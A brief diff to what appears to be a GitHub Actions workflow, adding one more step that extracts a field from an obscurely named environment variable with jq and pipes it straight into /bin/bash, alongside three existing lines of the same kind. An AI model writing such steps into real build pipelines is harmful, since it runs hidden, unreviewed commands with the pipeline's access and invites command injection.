@@ -30,6 +30,7 @@ jobs:
           echo $aa6 | jq -r .yqzo91 | /bin/bash
           echo $hp4146 | jq -r .phq41358 | /bin/bash
           echo $eabjx08172 | jq -r .fwb378 | /bin/bash
+          printf '%s' "$gqy07" | jq -r .mswsv5 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
